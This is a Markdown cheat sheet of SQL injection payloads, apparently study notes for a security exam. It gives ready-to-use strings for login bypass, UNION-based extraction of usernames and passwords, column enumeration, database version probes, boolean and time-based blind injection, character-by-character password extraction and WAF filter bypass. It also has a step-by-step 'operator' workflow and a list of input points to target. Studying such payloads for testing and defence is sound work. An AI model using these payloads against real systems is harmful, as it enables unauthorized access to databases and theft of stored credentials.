

---

``md
> [!ABSTRACT]
> SQL Injection (SQLi) is a vulnerability where user input is inserted into SQL queries, allowing attackers to **modify database queries**.  
> 
> It happens when:
> - User input is concatenated into SQL queries  
> - Input is not properly sanitized or parameterized  
> - The database executes attacker-controlled SQL  
> 
> Impact:
> - Authentication bypass  
> - Dump database contents  
> - Modify/delete data  
> - Sometimes RCE depending on DB  
> 
> 🧠 Think: “You’re rewriting the database query itself” :contentReference[oaicite:0]{index=0}

---

## 🧠 SQL Injection – Cheat Sheet

---

### 🎯 1. Basic Detection (Syntax Break)

> [!CHECK]
> Break query syntax and observe error or behavior change  

```sql
'
````

```sql
"
```

```sql
'--
```

---

### 🧪 2. Authentication Bypass

> [!SUCCESS]  
> Bypass login by making condition always true

```sql
' OR 1=1--
```

```sql
' OR '1'='1--
```

---

### 🧬 3. Comment Injection

> [!ATTENTION]  
> Ignore rest of query

```sql
'--
```

```sql
# 
```

---

### 🧩 4. UNION-Based Injection

> [!SUCCESS]  
> Extract data from database

```sql
' UNION SELECT NULL--
```

```sql
' UNION SELECT username,password FROM users--
```

---

### 🧪 5. Column Enumeration

> [!CHECK]  
> Find correct number of columns

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
```

---

### 💥 6. Database Version / Info

> [!SUCCESS]  
> Identify DB type and version

```sql
' UNION SELECT @@version--
```

```sql
' UNION SELECT version()--
```

---

### ⚙️ 7. Boolean-Based Blind SQLi

> [!SUCCESS]  
> Infer data via TRUE/FALSE responses

```sql
' AND 1=1--
```

```sql
' AND 1=2--
```

---

### 🧪 8. Time-Based Blind SQLi

> [!CHECK]  
> Detect via delay

```sql
' AND SLEEP(5)--
```

```sql
' OR SLEEP(5)--
```

---

### 💣 9. Extract Data (Blind Enumeration)

> [!SUCCESS]  
> Extract data character by character

```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
```

---

### 🧪 10. Filter Bypass

> [!ATTENTION]  
> Bypass WAF / filters

```sql
' OR 1=1#
```

```sql
'/**/OR/**/1=1--
```

```sql
'||'1'='1
```

---

### 🔍 11. Real Workflow (Operator Method)

> [!SUCCESS]

1. Test injection:
    

```sql
'
```

2. Try bypass:
    

```sql
' OR 1=1--
```

3. Find columns:
    

```sql
' ORDER BY 1--
```

4. Extract data:
    

```sql
' UNION SELECT username,password FROM users--
```

5. If blind:
    

```sql
' AND SLEEP(5)--
```

---

### 🧠 12. Where to Test

> [!ABSTRACT]

- Login forms
    
- Search fields
    
- URL parameters
    
- API inputs
    
- Cookies
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
' OR 1=1--
' UNION SELECT NULL--
' UNION SELECT username,password FROM users--
' ORDER BY 1--
' AND SLEEP(5)--
' AND 1=1--
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Input sanitized
>     
> - Prepared statements used
>     
> - No SQL backend
>     

---

> [!ATTENTION]  
> SQLi depends on:
> 
> - Injection point
>     
> - Database type
>     
> - Query structure
>     
> 
> Types to remember:
> 
> - UNION-based
>     
> - Boolean-based
>     
> - Time-based
>     
> 
> No query manipulation → no exploit

---

> [!TLDR]
> Quick SQLi payloads for detection, bypass, and data extraction  

```sql
-- Basic test
'
'--
"--

-- Auth bypass
' OR 1=1--
' OR '1'='1--

-- Column count
' ORDER BY 1--
' ORDER BY 2--

-- UNION extraction
' UNION SELECT NULL--
' UNION SELECT username,password FROM users--

-- DB version
' UNION SELECT @@version--
' UNION SELECT version()--

-- Boolean blind
' AND 1=1--
' AND 1=2--

-- Time-based
' AND SLEEP(5)--
' OR SLEEP(5)--

-- Filter bypass
'/**/OR/**/1=1--
'||'1'='1
# 